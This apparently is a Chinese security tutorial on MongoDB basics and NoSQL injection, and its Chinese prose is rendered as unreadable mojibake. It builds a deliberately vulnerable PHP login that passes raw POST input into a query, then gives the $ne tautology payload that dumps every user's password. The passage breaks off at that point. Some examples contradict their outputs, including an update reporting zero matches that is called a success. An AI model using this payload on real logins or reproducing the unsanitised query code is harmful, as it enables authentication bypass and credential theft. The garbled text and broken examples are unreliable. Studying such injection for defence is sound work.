<h3 id="æ•°æ®åº“ï¼ˆDatabaseï¼‰"><a href="#æ•°æ®åº“ï¼ˆDatabaseï¼‰" class="headerlink" title="æ•°æ®åº“ï¼ˆDatabaseï¼‰"></a>æ•°æ®åº“ï¼ˆDatabaseï¼‰</h3><p>ä¸ª MongoDB ä¸­å¯ä»¥å»ºç«‹å¤šä¸ªæ•°æ®åº“ã€‚MongoDB çš„å•ä¸ªå®ä¾‹å¯ä»¥å®¹çº³å¤šä¸ªç‹¬ç«‹çš„æ•°æ®åº“ï¼Œæ¯ä¸€ä¸ªéƒ½æœ‰è‡ªå·±çš„é›†åˆå’Œæƒé™ï¼Œä¸åŒçš„æ•°æ®åº“ä¹Ÿæ”¾ç½®åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ã€‚</p>
<p>ä½¿ç”¨ <code>show dbs</code> å‘½ä»¤å¯ä»¥æ˜¾ç¤ºæ‰€æœ‰æ•°æ®åº“çš„åˆ—è¡¨ï¼š</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; show dbs
admin   0.078GB
config  0.078GB
local   0.078GB
&gt;</code></pre>

<p>æ‰§è¡Œ <code>db</code> å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰æ•°æ®åº“å¯¹è±¡æˆ–é›†åˆï¼š</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; db
test
&gt;</code></pre>

<h3 id="æ–‡æ¡£ï¼ˆDocumentï¼‰"><a href="#æ–‡æ¡£ï¼ˆDocumentï¼‰" class="headerlink" title="æ–‡æ¡£ï¼ˆDocumentï¼‰"></a>æ–‡æ¡£ï¼ˆDocumentï¼‰</h3><p>æ–‡æ¡£æ˜¯ä¸€ç»„é”®å€¼ï¼ˆkey-valueï¼‰å¯¹ï¼Œç±»ä¼¼äº RDBMS å…³ç³»å‹æ•°æ®åº“ä¸­çš„ä¸€è¡Œã€‚MongoDB çš„æ–‡æ¡£ä¸éœ€è¦è®¾ç½®ç›¸åŒçš„å­—æ®µï¼Œå¹¶ä¸”ç›¸åŒçš„å­—æ®µä¸éœ€è¦ç›¸åŒçš„æ•°æ®ç±»å‹ï¼Œè¿™ä¸å…³ç³»å‹æ•°æ®åº“æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œä¹Ÿæ˜¯ MongoDB éå¸¸çªå‡ºçš„ç‰¹ç‚¹ã€‚</p>
<p>ä¸€ä¸ªç®€å•çš„æ–‡æ¡£ä¾‹å­å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;, &quot;age&quot;:19&#125;</code></pre>

<h3 id="é›†åˆï¼ˆCollectionï¼‰"><a href="#é›†åˆï¼ˆCollectionï¼‰" class="headerlink" title="é›†åˆï¼ˆCollectionï¼‰"></a>é›†åˆï¼ˆCollectionï¼‰</h3><p>é›†åˆå°±æ˜¯ MongoDB æ–‡æ¡£ç»„ï¼Œç±»ä¼¼äº RDBMS å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿä¸­çš„è¡¨æ ¼ã€‚é›†åˆå­˜åœ¨äºæ•°æ®åº“ä¸­ï¼Œé›†åˆæ²¡æœ‰å›ºå®šçš„ç»“æ„ï¼Œè¿™æ„å‘³ç€ä½ åœ¨å¯¹é›†åˆå¯ä»¥æ’å…¥ä¸åŒæ ¼å¼å’Œç±»å‹çš„æ•°æ®ã€‚</p>
<p>æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»¥ä¸‹ä¸åŒæ•°æ®ç»“æ„çš„æ–‡æ¡£æ’å…¥åˆ°é›†åˆä¸­ï¼š</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;&#125;
&#123;&quot;name&quot;:&quot;bunny&quot;, &quot;age&quot;:19&#125;
&#123;&quot;name&quot;:&quot;bob&quot;, &quot;age&quot;:20, &quot;groups&quot;:[&quot;admins&quot;,&quot;users&quot;]&#125;</code></pre>

<p>å½“æ’å…¥ä¸€ä¸ªæ–‡æ¡£æ—¶ï¼Œé›†åˆå°±ä¼šè¢«è‡ªåŠ¨åˆ›å»ºã€‚</p>
<p>å¦‚æœæˆ‘ä»¬è¦æŸ¥çœ‹å·²æœ‰é›†åˆï¼Œå¯ä»¥ä½¿ç”¨ <code>show collections</code> æˆ– <code>show tables</code> å‘½ä»¤ï¼š</p>
<pre><code class="highlight plaintext">&gt; show collections
all_users
&gt; show tables
all_users
&gt;</code></pre>

<h2 id="MongoDBåŸºç¡€æ“ä½œ"><a href="#MongoDBåŸºç¡€æ“ä½œ" class="headerlink" title="MongoDBåŸºç¡€æ“ä½œ"></a>MongoDBåŸºç¡€æ“ä½œ</h2><h3 id="åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»ºæ•°æ®åº“</h3><pre><code class="highlight plaintext">use DATABASENAME</code></pre>

<p>ä¸€é”®åˆ›å»ºï¼›è‹¥å·²å­˜åœ¨å°±è¿æ¥å¹¶åˆ‡æ¢åˆ°æŒ‡å®šæ•°æ®åº“</p>
<h3 id="åˆ›å»ºé›†åˆ"><a href="#åˆ›å»ºé›†åˆ" class="headerlink" title="åˆ›å»ºé›†åˆ"></a>åˆ›å»ºé›†åˆ</h3><pre><code class="highlight plaintext">db.createCollection(name,options)</code></pre>

<ul>
<li>nameï¼šè¦åˆ›å»ºçš„é›†åˆåç§°</li>
<li>optionsï¼šå¯é€‰å‚æ•°ï¼ŒæŒ‡å®šæœ‰å…³å†…å­˜å¤§å°åŠç´¢å¼•çš„é€‰é¡¹</li>
</ul>
<p>å¦‚ä¸‹å®ä¾‹ï¼Œæˆ‘ä»¬åœ¨ users æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ª all_users é›†åˆï¼š</p>
<pre><code class="highlight plaintext">&gt; use users
switched to db users
&gt; db.createCollection(&quot;all_users&quot;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;</code></pre>

<h3 id="æ’å…¥æ–‡æ¡£"><a href="#æ’å…¥æ–‡æ¡£" class="headerlink" title="æ’å…¥æ–‡æ¡£"></a>æ’å…¥æ–‡æ¡£</h3><pre><code class="highlight plaintext">db.COLLECTION_NAME.insert(document)</code></pre>

<p>å¦‚ä¸‹å®ä¾‹ï¼Œæˆ‘ä»¬å‘å­˜å‚¨åœ¨ users æ•°æ®åº“çš„ all_users é›†åˆä¸­æ’å…¥ä¸€ä¸ªæ–‡æ¡£ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.all_users.insert(&#123;name: &#x27;whoami&#x27;, 
    description: &#x27;the admin user&#x27;,
    age: 19,
    status: &#x27;A&#x27;,
    groups: [&#x27;admins&#x27;, &#x27;users&#x27;]
&#125;)</code></pre>

<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ–‡æ¡£æ•°æ®å®šä¹‰ä¸ºä¸€ä¸ªå˜é‡ï¼Œç„¶åå†æ‰§è¡Œæ’å…¥æ“ä½œå°†å˜é‡æ’å…¥ã€‚</p>
<h3 id="æ›´æ–°æ–‡æ¡£"><a href="#æ›´æ–°æ–‡æ¡£" class="headerlink" title="æ›´æ–°æ–‡æ¡£"></a>æ›´æ–°æ–‡æ¡£</h3><p>åœ¨ MongoDB ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>update()</code> æˆ– <code>save()</code> æ–¹æ³•æ¥æ›´æ–°é›†åˆä¸­çš„æ–‡æ¡£ã€‚</p>
<ul>
<li><strong>update() æ–¹æ³•</strong></li>
</ul>
<p>update() æ–¹æ³•ç”¨äºæ›´æ–°å·²å­˜åœ¨çš„æ–‡æ¡£ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">db.collection.update(
   &lt;query&gt;,
   &lt;update&gt;,
   &#123;
     upsert: &lt;boolean&gt;,
     multi: &lt;boolean&gt;,
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li>queryï¼šupdate æ“ä½œçš„æŸ¥è¯¢æ¡ä»¶ï¼Œç±»ä¼¼ sql update è¯­å¥ä¸­ where å­å¥åé¢çš„å†…å®¹ã€‚</li>
<li>updateï¼šupdate æ“ä½œçš„å¯¹è±¡å’Œä¸€äº›æ›´æ–°çš„æ“ä½œç¬¦ï¼ˆå¦‚ <code>$set</code>ï¼‰ç­‰ï¼Œå¯ä»¥ç†è§£ä¸º sql update è¯­å¥ä¸­ set å…³é”®å­—åé¢çš„å†…å®¹ã€‚</li>
<li>multiï¼šå¯é€‰ï¼Œé»˜è®¤æ˜¯ falseï¼Œåªæ›´æ–°æ‰¾åˆ°çš„ç¬¬ä¸€æ¡è®°å½•ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°ä¸º trueï¼Œå°±æŠŠæŒ‰æ¡ä»¶æŸ¥å‡ºæ¥å¤šæ¡è®°å½•å…¨éƒ¨æ›´æ–°ã€‚</li>
</ul>
<p>æ¥ç€æˆ‘ä»¬é€šè¿‡ update() æ–¹æ³•æ¥å°†å¹´é¾„ age ä» 19 æ›´æ–°åˆ° 20ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:19&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;)
WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)
&gt;
&gt; db.all_users.find().pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>

<p>æˆåŠŸå°† age ä» 19 æ”¹ä¸ºäº† 20ã€‚</p>
<p>ä»¥ä¸Šè¯­å¥åªä¼šä¿®æ”¹ç¬¬ä¸€æ¡å‘ç°çš„æ–‡æ¡£ï¼Œå¦‚æœä½ è¦ä¿®æ”¹å¤šæ¡ç›¸åŒçš„æ–‡æ¡£ï¼Œåˆ™éœ€è¦è®¾ç½® multi å‚æ•°ä¸º trueã€‚</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:&#x27;19&#x27;&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;, &#123;multi:true&#125;)</code></pre>

<ul>
<li><strong>save() æ–¹æ³•</strong></li>
</ul>
<p>save() æ–¹æ³•é€šè¿‡ä¼ å…¥çš„æ–‡æ¡£æ¥æ›¿æ¢å·²æœ‰æ–‡æ¡£ï¼Œ<code>_id</code> ä¸»é”®å­˜åœ¨å°±æ›´æ–°ï¼Œä¸å­˜åœ¨å°±æ’å…¥ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">db.collection.save(
   &lt;document&gt;,
   &#123;
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li>documentï¼šæ–‡æ¡£æ•°æ®ã€‚</li>
</ul>
<p>å¦‚ä¸‹å®ä¾‹ä¸­æˆ‘ä»¬æ›¿æ¢äº† <code>_id</code> ä¸º 60fa854cf8aaaf4f21049148 çš„æ–‡æ¡£æ•°æ®ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.all_users.save(&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 21,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;)</code></pre>

<h3 id="æŸ¥è¯¢æ–‡æ¡£"><a href="#æŸ¥è¯¢æ–‡æ¡£" class="headerlink" title="æŸ¥è¯¢æ–‡æ¡£"></a>æŸ¥è¯¢æ–‡æ¡£</h3><pre><code class="highlight plaintext">db.collection.find(query,projection)</code></pre>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li>queryï¼šå¯é€‰ï¼Œä½¿ç”¨æŸ¥è¯¢æ“ä½œç¬¦æŒ‡å®šæŸ¥è¯¢æ¡ä»¶ï¼Œç›¸å½“äº sql select è¯­å¥ä¸­çš„ where å­å¥ã€‚</li>
<li>projectionï¼šå¯é€‰ï¼Œä½¿ç”¨æŠ•å½±æ“ä½œç¬¦æŒ‡å®šè¿”å›çš„é”®ã€‚</li>
</ul>
<p>å¦‚ä¸‹å®ä¾‹æˆ‘ä»¬æŸ¥è¯¢äº†é›†åˆ all_users ä¸­çš„ age ä¸º 20 çš„æ•°æ®ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&quot;20&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : &quot;20&quot;, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<p>å¦‚æœä½ éœ€è¦ä»¥æ˜“è¯»çš„æ–¹å¼æ¥è¯»å–æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ <code>pretty()</code> æ–¹æ³•ä»¥æ ¼å¼åŒ–çš„æ–¹å¼æ¥æ˜¾ç¤ºæ‰€æœ‰æ–‡æ¡£ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:20&#125;).pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>

<h4 id="MongoDB-ä¸-RDBMS-ä¹‹é—´çš„ç±»æ¯”æ¯”è¾ƒ"><a href="#MongoDB-ä¸-RDBMS-ä¹‹é—´çš„ç±»æ¯”æ¯”è¾ƒ" class="headerlink" title="MongoDB ä¸ RDBMS ä¹‹é—´çš„ç±»æ¯”æ¯”è¾ƒ"></a>MongoDB ä¸ RDBMS ä¹‹é—´çš„ç±»æ¯”æ¯”è¾ƒ</h4><p>å¦‚æœä½ ç†Ÿæ‚‰å¸¸è§„çš„ SQL æ•°æ®ï¼Œé€šè¿‡ä¸‹è¡¨å¯ä»¥æ›´å¥½çš„ç†è§£ MongoDB çš„æ¡ä»¶è¯­å¥æŸ¥è¯¢ï¼š</p>
<table>
<thead>
<tr>
<th>æ“ä½œ</th>
<th>æ ¼å¼</th>
<th>èŒƒä¾‹</th>
<th>RDBMS ä¸­çš„ç±»ä¼¼è¯­å¥</th>
</tr>
</thead>
<tbody><tr>
<td>ç­‰äº</td>
<td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td>
<td><code>where name = &#39;whoami&#39;</code></td>
</tr>
<tr>
<td>å°äº</td>
<td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td>
<td><code>where age &lt; 19</code></td>
</tr>
<tr>
<td>å°äºæˆ–ç­‰äº</td>
<td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &lt;= 19</code></td>
</tr>
<tr>
<td>å¤§äº</td>
<td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt; 19</code></td>
</tr>
<tr>
<td>å¤§äºæˆ–ç­‰äº</td>
<td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt;= 19</code></td>
</tr>
<tr>
<td>ä¸ç­‰äº</td>
<td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td>
<td><code>where likes != 19</code></td>
</tr>
</tbody></table>
<p>è€ŒæŸ¥è¯¢æ—¶çš„<strong>ANDè¯­å¥</strong>çš„è¡¨ç¤ºå³ç”¨<code>,</code>éš”å¼€å¤šä¸ªé”®å€¼å¯¹</p>
<p>è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;status&quot;:&quot;B&quot;, &quot;age&quot;:20&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ef8f8aaaf4f2104914e&quot;), &quot;name&quot; : &quot;bob&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;B&quot;, &quot;groups&quot; : [ &quot;normals&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<p>ä»¥ä¸Šå®ä¾‹ä¸­ç±»ä¼¼äº RDBMS ä¸­çš„ WHERE è¯­å¥ï¼š<code>WHERE status=&#39;B&#39; AND age=20</code></p>
<p>æŸ¥è¯¢æ—¶çš„<strong>ORè¯­å¥</strong>è¦åœ¨å¼€å¤´åŠ ä¸Š<code>$or</code></p>
<p>è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">&gt; db.col.find(
   &#123;
      $or: [
         &#123;key1: value1&#125;, &#123;key2:value2&#125;
      ]
   &#125;
).pretty()</code></pre>

<p>å¦‚ä¸‹å®ä¾‹ï¼Œæˆ‘ä»¬æŸ¥è¯¢é”® <code>status</code> å€¼ä¸º A æˆ–é”® <code>age</code> å€¼ä¸º 19 çš„æ–‡æ¡£ã€‚</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>

<p>å¦‚ä¸‹å®ä¾‹ï¼Œæˆ‘ä»¬æŸ¥è¯¢é”® <code>status</code> å€¼ä¸º A æˆ–é”® <code>age</code> å€¼ä¸º 19 çš„æ–‡æ¡£ã€‚</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>

<p><strong>è”åˆä½¿ç”¨</strong></p>
<p>ä»¥ä¸‹å®ä¾‹æ¼”ç¤ºäº† AND å’Œ OR è”åˆä½¿ç”¨ï¼Œç±»ä¼¼äº RDBMS ä¸­çš„ WHERE è¯­å¥ï¼š <code>where age&gt;19 AND (name=&#39;whoami&#39; OR status=&#39;A&#39;)</code></p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;, $or: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9176f8aaaf4f21049150&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<h2 id="æ³¨å…¥æ—¶é—´åˆ°"><a href="#æ³¨å…¥æ—¶é—´åˆ°" class="headerlink" title="æ³¨å…¥æ—¶é—´åˆ°"></a>æ³¨å…¥æ—¶é—´åˆ°</h2><p>æŒ‰ç…§è¯­è¨€åˆ†ç±»</p>
<p>å¯ä»¥åˆ†ä¸º</p>
<ul>
<li>PHPæ•°ç»„æ³¨å…¥</li>
<li>jsæ³¨å…¥</li>
<li>mongoshellæ‹¼æ¥æ³¨å…¥</li>
</ul>
<p>æŒ‰ç…§æ”»å‡»æœºåˆ¶åˆ†ç±»</p>
<p>å¯ä»¥åˆ†ä¸º</p>
<ul>
<li>é‡è¨€å¼æ³¨å…¥</li>
<li>è”åˆæŸ¥è¯¢æ³¨å…¥</li>
<li>jsæ³¨å…¥</li>
<li>ç›²æ³¨</li>
</ul>
<hr>
<ul>
<li><strong>é‡è¨€å¼æ³¨å…¥</strong></li>
</ul>
<p>åˆç§°ä¸ºæ°¸çœŸå¼ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚</p>
<ul>
<li><strong>è”åˆæŸ¥è¯¢æ³¨å…¥</strong></li>
</ul>
<p>è”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„ SQL æ³¨å…¥æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚</p>
<ul>
<li><strong>JavaScript æ³¨å…¥</strong></li>
</ul>
<p>MongoDB Server æ”¯æŒ JavaScriptï¼Œè¿™ä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ï¼Œä½†æ˜¯ä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„çš„ JavaScript ä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚</p>
<ul>
<li><strong>ç›²æ³¨</strong></li>
</ul>
<p>å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>$regex</code> æ­£åˆ™è¡¨è¾¾å¼æ¥è¾¾åˆ°å’Œä¼ ç»Ÿ SQL æ³¨å…¥ä¸­ <code>substr()</code> å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œä¸” NoSQL ç”¨åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚</p>
<h3 id="PHPä¸­çš„æ³¨å…¥"><a href="#PHPä¸­çš„æ³¨å…¥" class="headerlink" title="PHPä¸­çš„æ³¨å…¥"></a>PHPä¸­çš„æ³¨å…¥</h3><h4 id="é‡è¨€å¼æ³¨å…¥"><a href="#é‡è¨€å¼æ³¨å…¥" class="headerlink" title="é‡è¨€å¼æ³¨å…¥"></a>é‡è¨€å¼æ³¨å…¥</h4><p>ä¿è¯ä¸€ä¸ªæ°¸çœŸæ¡ä»¶å³å¯</p>
<p>é¦–å…ˆåœ¨ MongoDB ä¸­é€‰ä¸­ test æ•°æ®åº“ï¼Œåˆ›å»ºä¸€ä¸ª users é›†åˆå¹¶æ’å…¥æ–‡æ¡£æ•°æ®ï¼š</p>
<pre><code class="highlight plaintext">&gt; use test
switched to db test
&gt;
&gt; db.createCollection(&#x27;users&#x27;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;
&gt; db.users.insert(&#123;username: &#x27;admin&#x27;, password: &#x27;123456&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;whoami&#x27;, password: &#x27;657260&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bunny&#x27;, password: &#x27;964795&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bob&#x27;, password: &#x27;965379&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;</code></pre>

<p>ç„¶åç¼–å†™ index.phpï¼š</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];

$query = new MongoDB\Driver\Query(array(
    &#x27;username&#x27; =&gt; $username,
    &#x27;password&#x27; =&gt; $password
));

$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) &#123;
    foreach ($result as $user) &#123;
        $user = ((array)$user);
        echo &#x27;====Login Success====&lt;br&gt;&#x27;;
        echo &#x27;username:&#x27; . $user[&#x27;username&#x27;] . &#x27;&lt;br&gt;&#x27;;
        echo &#x27;password:&#x27; . $user[&#x27;password&#x27;] . &#x27;&lt;br&gt;&#x27;;
    &#125;
&#125;
else&#123;
    echo &#x27;Login Failed&#x27;;
&#125;
?&gt;</code></pre>

<p>å¦‚ä¸‹ï¼Œå½“æ­£å¸¸ç”¨æˆ·æƒ³è¦ç™»é™† whoami ç”¨æˆ·æ—¶ï¼ŒPOST æ–¹æ³•æäº¤çš„æ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">username=whoami&amp;password=657260</code></pre>

<p>è¿›å…¥ PHP åçš„ç¨‹åºæ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; &#x27;whoami&#x27;,
    &#x27;password&#x27; =&gt; &#x27;657260&#x27;
)</code></pre>

<p>è¿›å…¥ MongoDB åæ‰§è¡Œçš„æŸ¥è¯¢å‘½ä»¤ä¸ºï¼š</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#x27;whoami&#x27;, &#x27;password&#x27;:&#x27;657260&#x27;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9c80257f18542b68c4b9&quot;), &quot;username&quot; : &quot;whoami&quot;, &quot;password&quot; : &quot;657260&quot; &#125;</code></pre>

<p>æˆ‘ä»¬ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œå¯¹ç”¨æˆ·è¾“å…¥æ²¡æœ‰åšä»»ä½•è¿‡æ»¤ä¸æ ¡éªŒï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>$ne</code> å…³é”®å­—æ„é€ ä¸€ä¸ªæ°¸çœŸçš„æ¡ä»¶å°±å¯ä»¥å®Œæˆ NoSQL æ³¨å…¥ï¼š</p>
<pre><code class="highlight plaintext">username[$ne]=1&amp;password[$ne]=1</code></pre>

<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒæˆåŠŸæŸ¥å‡ºæ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¯´æ˜æˆåŠŸæ³¨å…¥äº†ä¸€ä¸ªæ°¸çœŸæŸ¥è¯¢æ¡ä»¶ï¼š</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png" alt="20210724161640-790ad458-ec57-1"></p>
<p>æäº¤çš„æ•°æ®è¿›å…¥ PHP åçš„æ•°æ®å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">array(
    &#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),
    &#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)
)</code></pre>

<p>è¿›å…¥ MongoDB åæ‰§è¡Œçš„æŸ¥è¯¢å‘½ä»¤ä¸ºï¼š</p>
<pre><code class="highlight plaintext">&gt; db.users.find(&#123;&#x27;username&#x27;:&#123;$ne:1&#125;, &#x27;password&#x27;:&#123;$ne:1&#125;&#125;)
